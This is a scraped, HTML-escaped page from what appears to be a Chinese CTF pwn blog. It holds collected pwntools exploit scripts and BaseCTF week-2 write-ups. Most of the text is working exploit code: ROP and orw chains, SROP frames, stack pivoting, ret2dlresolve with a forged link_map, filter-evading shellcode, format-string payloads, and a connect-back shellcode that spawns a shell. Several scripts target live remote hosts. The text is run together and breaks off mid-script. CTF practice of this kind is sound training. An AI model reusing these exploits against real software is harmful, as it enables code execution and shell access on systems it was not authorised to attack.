*context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)#39.106.48.123 19775p=remote(&#x27;39.106.48.123&#x27;,19775)#p=process(&#x27;./shell&#x27;)elf=ELF(&#x27;./shell&#x27;)#libc=ELF(&#x27;./libc.so.6&#x27;)#gdb.attach(p)shellcode = asm(&#x27;&#x27;&#x27; xor rax,rax mov rsp,rbp mov eax, 0x67616c66 push rax xor rax,rax xor rdi, rdi sub rdi, 100 mov rsi, rsp xor edx, edx xor r10, r10 mov ax,0x101 syscall push 3 pop rdi push 0x1010 lea rbx, [rsp+8] push rbx mov rsi, rsp push 1 pop rdx xor r10, r10 xor r8, r8 mov ax,0x147 syscall push 1 pop rdi push 0x1 pop rdx push 0x1010 lea rbx, [rsp+8] push rbx mov rsi, rsp push 20 pop rax syscall&#x27;&#x27;&#x27;)&quot;&quot;&quot;shellcode = &#x27;&#x27;&#x27; mov rsp, 0x4040c0&#x27;&#x27;&#x27;shellcode += shellcraft.openat(-100, &quot;/flag&quot;, 0, 0)shellcode += shellcraft.sendfile(1, 3, 0, 0x100&quot;&quot;&quot;p.recvuntil(b&#x27;World!\\n&#x27;)p.send(shellcode)p.interactive() 任意地址劫持rop(orw)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#coding:utf-8from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)#39.106.48.123 17975filename=&#x27;./one&#x27;a=1if a: p=remote(&#x27;39.106.48.123&#x27;,17975)else: p=process(filename) gdb.attach(p) elf=ELF(filename)libc=ELF(&#x27;./libc.so.6&#x27;)close=elf.got[&#x27;close&#x27;]init=0x4011f6main_read=0x401421bss=0x404500payload=b&#x27;a&#x27;*0x10+p64(bss)+p64(init)+p64(main_read)#第一次执行mainp.recvuntil(b&#x27;\\x3a\\x20&#x27;)p.send(p64(close)) p.recvuntil(b&#x27;\\x3a\\x20\\x00&#x27;)p.send(b&#x27;\\xc0&#x27;) sleep(1)p.send(payload) p.recv(0xb8)libc_main_start = int.from_bytes(p.recv(6), byteorder=&#x27;little&#x27;)-139 p.recv()print(hex(libc_main_start))libc_base=libc_main_start-libc.sym[&#x27;__libc_start_main&#x27;]pop_rdi=libc_base+0x10f75bpop_rsi=libc_base+0x110a4d pop_rdx=libc_base+0x66b9a read=libc_base+libc.sym[&#x27;read&#x27;]open_addr=libc_base+libc.sym[&#x27;open&#x27;]write=libc_base+libc.sym[&#x27;write&#x27;]payload=b&#x27;a&#x27;*0x18+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss)+p64(read)payload+=p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(open_addr)payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x20)+p64(pop_rdx)+p64(0x30)+p64(read)payload+=b&#x27;a&#x27;*0x19payload+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss+0x20)+p64(write)print(hex(len(payload)))#第二次执行程序中的readp.recv()p.send(payload) sleep(1)p.send(b&#x27;./flag\\x00\\x00&#x27;) p.interactive() SROPexp12345678910111213141516171819202122232425262728293031from pwn import*context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;) p=process(&#x27;./pwn_1&#x27;)#p=remote(&#x27;node4.buuoj.cn&#x27;,29475)elf=ELF(&#x27;./pwn_1&#x27;) syscall =elf.plt[&#x27;syscall&#x27;]rdi =0x401203lea =0x401171 #lea rax, [rbp+var_30]bss =0x404050 +0x500 p.recvuntil(&#x27;welcome to srop!\\n&#x27;) frame=SigreturnFrame()frame.rdi =59frame.rsi =bss -0x30frame.rdx =0frame.rcx =0frame.rsp =bss +0x38frame.rip =syscall payload =b&#x27;a&#x27;*0x30 +flat(bss,lea)p.send(payload) payload =b&#x27;/bin/sh\\x00&#x27; +b&#x27;a&#x27;*0x30 +flat(lea,syscall,frame) p.send(payload)payload1=b&#x27;a&#x27;*0xfp.send(payload1)p.interactive() 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#coding=utf8from pwn import *sh = process(&#x27;./smallest&#x27;)small = ELF(&#x27;./smallest&#x27;)context.arch = &#x27;amd64&#x27;syscall_ret = 0x00000000004000BEstart_addr = 0x00000000004000B0payload = p64(start_addr) * 3sh.send(payload)#首先,发送start_addr的地址,因为是写在栈顶的,所以就是read的返回地址#会返回到start_addrsh.send(&#x27;\\xb3&#x27;)#返回后再次调用read函数的时候输入一个字节,read函数会把读入的字节数放到rax#这样就达到了rax置为1的目的，同时会把rsp的后一位写为\\xB3,这样返回地址就不是start_addr了#而是4000B3,这就避免了rax被xor置零stack_addr = u64(sh.recv()[8:16])#此时,这样我们就回去syscall调用write函数里，输出的就是栈上的0x400长度的内容#别忘了当是输入的是3个start_addr,所以前八个字节是start_addr，后面的才是我们要用的log.success(&#x27;leak stack addr :&#x27; + hex(stack_addr))#现在我们拿到栈的地址,同时，因为当时是写了三个start_addr,现在又回到了start_addr#开始构造!我们要想要syscall调用sigreturn需要把rax设置为15,通过read实现read = SigreturnFrame()read.rax = constants.SYS_readread.rdi = 0read.rsi = stack_addrread.rdx = 0x400read.rsp = stack_addrread.rip = syscall_ret#相当于read(0,stack_addr,0x400),同时返回地址是start_addrread_frame_payload = p64(start_addr) + p64(syscall_ret) + str(read)sh.send(read_frame_payload)#调用read函数,等待接收sh.send(read_frame_payload[8:8+15])#总共是15个#这样通过read返回的字节使得rax为15,这样的话就会去恢复构造的read那一段内容，来接受我们的输入execve = SigreturnFrame()execve.rax=constants.SYS_execveexecve.rdi=stack_addr + 0x120execve.rsi=0x0execve.rdx=0x0execve.rsp=stack_addrexecve.rip=syscall_retexecv_frame_payload=p64(start_addr)+p64(syscall_ret)+str(execve)#返回start_addr等待输入print len(execv_frame_payload)execv_frame_payload_all=execv_frame_payload+(0x120-len(execv_frame_payload ))*&#x27;\\x00&#x27;+&#x27;/bin/sh\\x00&#x27;#先计算一下长度,让前面的添上几个&#x27;\\x00&#x27;之后正好是120，然后再填上&#x27;/bin/sh&#x27;sh.send(execv_frame_payload_all)sh.send(execv_frame_payload_all[8:8+15])sh.interactive() stack_migrationexp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *from LibcSearcher import LibcSearchercontext(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)filename=&#x27;./pwn&#x27;elf = ELF(filename)p = remote(&#x27;node5.buuoj.cn&#x27;,27348)libc = ELF(&#x27;./libc.so.6&#x27;)puts_got=elf.got[&#x27;puts&#x27;]bss=elf.bss(0x500)puts_plt=elf.plt[&#x27;puts&#x27;]leave=0x401227read=0x4011ffpop_rdi=0x4012b3ret=0x40101apop_rbp=0x40115dp.recvuntil(b&#x27;me:\\n&#x27;)payload1=b&#x27;a&#x27;*(0x50)+p64(bss)+p64(read)p.send(payload1)p.recvuntil(b&#x27;funny\\n&#x27;)payload2 =p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rbp)+p64(bss+0x800)+p64(read)payload2 = payload2.ljust(0x50,b&#x27;\\x00&#x27;)payload2 += p64(bss-0x58)+p64(leave) &#x27;&#x27;&#x27;payload2 =p64(pop_rdi) +p64(puts_got) +p64(puts_plt)payload2 +=p64(pop_rbp) +p64(bss +0x800) +p64(read)payload2 =payload2.ljust(0x50, b&#x27;\\x00&#x27;) +p64(bss -0x58) +p64(leave)&#x27;&#x27;&#x27;#gdb.attach(p)p.send(payload2)puts_addr = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(&#x27;puts_addr:&#x27;,hex(puts_addr))libc_base=puts_addr-libc.sym.putssystem=libc_base+libc.sym.systembinsh=libc_base+next(libc.search(b&quot;/bin/sh\\x00&quot;))print(&#x27;system:&#x27;,hex(system))payload3=p64(pop_rdi)+p64(binsh)+p64(system)payload3=payload3.ljust(0x50,b&#x27;a&#x27;)payload3+=p64(bss+0x800-0x58)+p64(leave)p.send(payload3)p.recv()p.interactive() ret2dlresolveexp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#32位from pwn import *from struct import packfrom ctypes import *#from LibcSearcher import *def s(a) : p.send(a)def sa(a, b) : p.sendafter(a, b)def sl(a) : p.sendline(a)def sla(a, b) : p.sendlineafter(a, b)def r() : return p.recv()def pr() : print(p.recv())def rl(a) : return p.recvuntil(a)def inter() : p.interactive()def debug(): gdb.attach(p) pause()def get_addr() : return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))def csu(rdi, rsi, rdx, rbp, rip, gadget) : return p64(gadget) + p64(0) + p64(rbp) + p64(rdi) + p64(rsi) + p64(rdx) + p64(rip) + p64(gadget - 0x1a)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = process(&#x27;./pwn&#x27;)#p = remote(&#x27;1.14.71.254&#x27;, 28966)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)leave = 0x08049105ret = 0x08049009PLT0 = 0x8049030buf = elf.bss() + 0x800rel_plt = 0x8048398 #objdump -s -j .rel.plt pwndynsym = 0x804821cdynstr = 0x80482BC#gdb.attach(p, &#x27;b *0x80491C1&#x27;)sa(b&#x27;&gt; \\n&#x27;, b&#x27;a&#x27;*0x18 + p32(buf) + p32(elf.sym[&#x27;read&#x27;]) + p32(leave) + p32(0) + p32(buf) + p32(0x100))sleep(3)# set fake_st_namefake_st_name = buf + 0x34 - dynstr# set fake_Elf_Symr_sym = (buf + 0x1c - dynsym) / 0x10r_type = 7r_info = (int(r_sym) &lt;&lt; 8) + r_typeputs_str_addr = 0x80482F3fake_Elf_Sym = p32(fake_st_name) + p32(0)*2 + p32(0x12) + p32(0)*2# set fake_Elf_Relrealoc_index = buf + 0x14 - rel_pltfake_Elf_Rel = p32(elf.got[&#x27;puts&#x27;]) + p32(r_info)payload = b&#x27;a&#x27;*4 + p32(PLT0) + p32(realoc_index) + p32(0) + p32(buf + 0x3c)payload += fake_Elf_Rel # buf + 0x14payload += fake_Elf_Sym # buf + 0x1cpayload += b&quot;system&quot; + p16(0) #buf+0x34payload += b&quot;/bin/sh\\x00&quot;s(payload)inter()#pause() 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#64位from pwn import *from struct import packfrom ctypes import *from LibcSearcher import *import base64def s(a): p.send(a)def sa(a, b): p.sendafter(a, b)def sl(a): p.sendline(a)def sla(a, b): p.sendlineafter(a, b)def r(): p.recv()def pr(): print(p.recv())def rl(a): return p.recvuntil(a)def inter(): p.interactive()def debug(): gdb.attach(p) pause()def get_addr(): return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def get_sb(): return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = process(&#x27;./pwn&#x27;)#p = remote(&#x27;spdc-1.play.hfsc.tf&#x27;, 40003)elf = ELF(&#x27;./pwn&#x27;)#libc = ELF(&#x27;./libc-2.27-x64.so&#x27;)libc = ELF(&#x27;/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&#x27;)sleep(0.1)s(&quot;V2VsY29tZSB0byBOS0NURiE=&quot;)sleep(0.1)s(&quot;dGVsbCB5b3UgYSBzZWNyZXQ6&quot;)sleep(0.1)s(&quot;SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45&quot;)sleep(0.1)s(&quot;Y2FuIHlvdSBmaW5kIG1lPw==&quot;)sleep(0.1)rdi = 0x401683rsi_r15 = 0x401681rbp = 0x40117dleave = 0x4013c2ret = 0x40101aPLT1 = 0x401026buf = elf.bss() + 0x400def fake_Linkmap_payload(fake_linkmap_addr,known_func_ptr,offset): # &amp;(2**64-1)是因为offset通常为负数，如果不控制范围，p64后会越界，发生错误 linkmap = p64(offset &amp; (2 ** 64 - 1))#l_addr # fake_linkmap_addr + 8，也就是DT_JMPREL，至于为什么有个0，可以参考IDA上.dyamisc的结构内容 linkmap += p64(0) # 可以为任意值 linkmap += p64(fake_linkmap_addr + 0x18) # 这里的值就是伪造的.rel.plt的地址 # fake_linkmap_addr + 0x18,fake_rel_write,因为write函数push的索引是0，也就是第一项 linkmap += p64((fake_linkmap_addr + 0x30 - offset) &amp; (2 ** 64 - 1)) # Rela-&gt;r_offset,正常情况下这里应该存的是got表对应条目的地址，解析完成后在这个地址上存放函数的实际地址，此处我们只需要设置一个可读写的地址即可 linkmap += p64(0x7) # Rela-&gt;r_info,用于索引symtab上的对应项，7&gt;&gt;32=0，也就是指向symtab的第一项 linkmap += p64(0)# Rela-&gt;r_addend,任意值都行 linkmap += p64(0)#l_ns # fake_linkmap_addr + 0x38, DT_SYMTAB linkmap += p64(0) # 参考IDA上.dyamisc的结构 linkmap += p64(known_func_ptr - 0x8) # 这里的值就是伪造的symtab的地址,为已解析函数的got表地址-0x8 linkmap += b&#x27;/bin/sh\\x00&#x27; # buf+0x48 linkmap = linkmap.ljust(0x68, b&#x27;A&#x27;) linkmap += p64(fake_linkmap_addr) # fake_linkmap_addr + 0x68, 对应的值的是DT_STRTAB的地址，由于我们用不到strtab，所以随意设置了一个可读区域 linkmap += p64(fake_linkmap_addr + 0x38) # fake_linkmap_addr + 0x70 , 对应的值是DT_SYMTAB的地址 linkmap = linkmap.ljust(0xf8, b&#x27;A&#x27;) linkmap += p64(fake_linkmap_addr + 0x8) # fake_linkmap_addr + 0xf8, 对应的值是DT_JMPREL的地址 return linkmap#gdb.attach(p, &#x27;b *0x4013E8&#x27;)s(b&#x27;a&#x27;*0x30 + p64(buf) + p64(rsi_r15) + p64(buf)*2 + p64(elf.sym[&#x27;read&#x27;]) + p64(rdi) + p64(buf + 0x48) + p64(ret) + p64(PLT1) + p64(buf) + p64(0))sleep(2)fake_link_map = fake_Linkmap_payload(buf, elf.got[&#x27;setbuf&#x27;], libc.sym[&#x27;system&#x27;] - libc.sym[&#x27;setbuf&#x27;])s(fake_link_map)inter()#pause() shellcodeexp转32位|openat，mmap，writev123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899from pwn import *from LibcSearcher import *#8.147.132.32 13663filename=&#x27;./s&#x27;a=0context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)if a: io=remote(&#x27;8.147.132.32&#x27;,13663)else: io=process(filename) #gdb.attach(io)elf=ELF(filename)ia = lambda : io.interactive()def se(item): ru(b&quot;\\x6e\\x3a\\x20&quot;) sl(b&quot;1&quot;) ru(b&quot;\\xa4\\x3a\\x20&quot;) sl(item) ru(b&quot;\\x6e\\x3a\\x20&quot;) sl(b&quot;1&quot;) ru(b&quot;\\xa4\\x3a\\x20&quot;) sl(item) shell=&quot;&quot;&quot; xor rax,rax mov rsp,rbp mov eax, 0x67616c66 push rax xor rax,rax xor rdi, rdi sub rdi, 100 mov rsi, rsp xor edx, edx xor r10, r10 mov ax,0x101 syscall mov rsi, 0x1000 mov r10,1 mov r9d, 0 mov r8d, eax mov edx, 1 /*共享映射*/ mov edi, 0x2333000 mov rax, 9 syscall push 1 pop rdi push 0x100 pop rdx push rbx mov rsi, 0xd000788 push 20 pop rax syscall &quot;&quot;&quot;#64位openat，mmap，writev，这里writev的第二参数是数组，所以我们要构造一个数组shell1 = b&quot;\\x48\\x31\\xC0\\x48\\x89\\xEC\\xB8\\x66&quot;shell2 = b&quot;\\x6C\\x61\\x67\\x50\\x48\\x31\\xC0\\x48&quot;shell3 = b&quot;\\x31\\xFF\\x48\\x83\\xEF\\x64\\x48\\x89&quot;shell4 = b&quot;\\xE6\\x31\\xD2\\x4D\\x31\\xD2\\x66\\xB8&quot;shell5 = b&quot;\\x01\\x01\\x0F\\x05\\x48\\xC7\\xC6\\x00&quot;shell6 = b&quot;\\x10\\x00\\x00\\x49\\xC7\\xC2\\x01\\x00&quot;shell7 = b&quot;\\x00\\x00\\x41\\xB9\\x00\\x00\\x00\\x00&quot;shell8 = b&quot;\\x41\\x89\\xC0\\xBA\\x01\\x00\\x00\\x00&quot;shell9 = b&quot;\\xBF\\x00\\x30\\x33\\x02\\x48\\xC7\\xC0&quot;shell10 = b&quot;\\x09\\x00\\x00\\x00\\x0F\\x05\\x6A\\x01&quot;shell11 = b&quot;\\x5F\\x68\\x00\\x01\\x00\\x00\\x5A\\x53&quot;shell12 = b&quot;\\x48\\xC7\\xC6\\x88\\x07\\x00\\x0D\\x6A&quot;shell13 = b&quot;\\x14\\x58\\x0F\\x05\\x00\\x00\\x00&quot;shell14 = b&quot;\\x00\\x30\\x33\\x02\\x00\\x00\\x00\\x00&quot;#构造数组shell15 = b&quot;\\x40&quot;ru(b&quot;option: &quot;)#gdb.attach(io)sl(b&quot;2&quot;)ia()&quot;&quot;&quot;xor rsp,rspmov esp,0xd000200mov DWORD PTR [esp+4],0x23mov DWORD PTR [esp],0xd000732 #这里是需要返回地址retfd&quot;&quot;&quot;&quot;&quot;&quot;xor rsp,rspmov esp,0xd000200push 0x23push 0xd00732 #这里是需要返回地址retfq&quot;&quot;&quot; 禁\\x0f\\x05,不含\\x001234567891011121314151617181920212223242526272829303132333435363738394041#coding:utf-8from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)#8.147.132.32 26891p=remote(&#x27;8.147.132.32&#x27;,26891)#p=process(&#x27;./asm&#x27;)#elf=ELF(&#x27;./asm&#x27;)#libc=ELF(&#x27;./libc.so.6&#x27;)#gdb.attach(p)#7ffed664f000 sc = &#x27;&#x27;&#x27;xor byte ptr [rdi+0xe], 0x5lea rdi, [rsi+0x10]xor rsi, rsimov al, 0x3b&#x27;&#x27;&#x27;payload = asm(sc) + p8(0xf)payload = payload.ljust(0x10, b&#x27;\\0&#x27;) + b&#x27;/bin/sh\\0&#x27;#payload=asm(sc)p.recvuntil(b&#x27;\\x0a&#x27;)p.recv()p.send(payload)#p.send(b&#x27;cat flag&#x27;)p.interactive()&quot;&quot;&quot;sc=&#x27;&#x27;&#x27; mov al,0x5 xor [rdi+0x30], rax xor rdi, rdi mov rcx, 0x68732f6e69622f2f shr rcx, 8 mov [rsi],rcx mov rdi,rsi xor rsi,rsi mov al, 59 &#x27;&#x27;&#x27;payload=asm(sc).ljust(0x2f,b&#x27;\\x90&#x27;)+b&#x27;\\x0f&#x27;&quot;&quot;&quot; socket123456789101112131415from pwn import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)#8.147.132.32 37451#sh = listen(44453)#io=process(&#x27;./o&#x27;)io = remote(&quot;8.147.132.32&quot;,29399)#shellcode = asm(shellcraft.connect(&#x27;0.0.0.0&#x27;,4443,&#x27;ipv4&#x27;)+shellcraft.dupsh())shellcode =asm(&quot;mov rsp,0xd000900&quot;)shellcode += asm(shellcraft.connect(&#x27;0.0.0.0&#x27;,44453)+shellcraft.dupsh())io.sendline(shellcode)#sh.wait_for_connection()io.interactive()#sh.recv() shellcode+socket本地进程通信 | Pwn进你的心 (ywhkkx.github.io) Getshell远程：真·RCE 正连？反连？不连？ | Clang裁缝店 (xuanxuanblingbling.github.io) 深入理解 pwn 题中的正连&#x2F;反连 tcp | blingbling’s blog (blingblingxuanxuan.github.io)","categories":[{"name":"note","slug":"note","permalink":"http://example.com/categories/note/"}],"tags":[{"name":"note","slug":"note","permalink":"http://example.com/tags/note/"}]},{"title":"","slug":"Basectf_week2-pwn","date":"2024-09-06T07:43:07.052Z","updated":"2024-09-13T02:17:27.773Z","comments":true,"path":"2024/09/06/Basectf_week2-pwn/","permalink":"http://example.com/2024/09/06/Basectf_week2-pwn/","excerpt":"","text":"Basectf_pwnweek2format_string_level0很简单的格式化字符串，打开了flag文件，直接gdb调试看看 非常明显，flag就在栈上，直接利用格式化字符串漏洞攻击就可以了 format_string_level1没开pie，丢ida里直接看 出现格式化字符串漏洞，当参数target为true是，即可直接拿到flag，所以思路很简单，利用格式化字符串漏洞将参数target的值覆盖即可 以下是exp 12345678910111213from pwn import *#from LibcSearcher import LibcSearcherfilename=&#x27;./vuln1&#x27;elf = ELF(filename)context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)p=remote(&#x27;challenge.basectf.fun&#x27;,39594)#p=process(filename)offset=6aim=0x4040B0#payload=b&#x27;aaaa%7$n&#x27;+p64(aim)payload=fmtstr_payload(offset, &#123;aim: b&#x27;10&#x27;&#125;)p.send(payload)p.interactive() gift函数太多懒得看，差点找不到主函数，没开pie，直接rop链打进去 以下是exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394from pwn import *from struct import pack#from LibcSearcher import LibcSearcherfilename=&#x27;./gift&#x27;elf = ELF(filename)context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)io=remote(&#x27;challenge.basectf.fun&#x27;,35837)#io =process(filename)shell=0x7fffffffdcd0p = b&#x27;&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x0000000000409f9e) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004c50e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x0000000000419484) # pop rax ; retp += b&#x27;/bin//sh&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000044a5e5) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000409f9e) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004c50e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x000000000043d350) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000044a5e5) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000401f2f) # pop rdi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004c50e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x0000000000409f9e) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004c50e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x000000000047f2eb) # pop rdx ; pop rbx ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004c50e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x4141414141414141) # paddingp += pack(&#x27;&lt;Q&#x27;, 0x000000000043d350) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000471350) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000401ce4) # syscallpayload=b&#x27;a&#x27;*0x28+p#payload=b&#x27;a&#x27;*0x28+p64(shell)+asm(shellcraft.sh())io.recv()io.sendline(payload)io.interactive() shellcode_level1只有俩个字节可操控，这可怎么办 这题思路有点难想出来，看看寄存器值？什么意思呢 直接进gdb里调试看看 rax&#x3D;0 rdi&#x3D;0 rsi&#x3D;[buf] rdx&#x3D;0x500 以下是官方exp 123456789101112from pwn import *# p = process(&#x27;./attachment&#x27;)p = remote(&#x27;challenge.basectf.fun&#x27;, 27606)context.arch=&#x27;amd64&#x27;shellcode = asm(&quot;syscall&quot;) # 即&#x27;\\x0f\\x05&#x27;p.send(shellcode)shellcode = b&#x27;\\x90&#x27;*2 + asm(shellcraft.sh()) # &#x27;\\x90&#x27;为nop的汇编，覆盖掉之前的syscallp.send(shellcode)p.interactive() 她与你皆失去 拿到附件解压，发现给了libc，估计这是道ret2libc，先checksec一下 没开pie，canary丢ida里瞧瞧 没有后门函数，很明显可以栈溢出，很经典的题目 基本操作，写出第一段payload 由于已经给了libc，所以这里直接调用即可，binsh查找也要改用next，其他正常操作，这题要用ret堆栈平衡，有的题需要用ret，有的题用ret反而出错，我也不太懂，都试试吧 以下是完整exp 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *from LibcSearcher import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)p=process(&#x27;./aaa&#x27;)p=remote(&#x27;challenge.basectf.fun&#x27;,38679)elf = 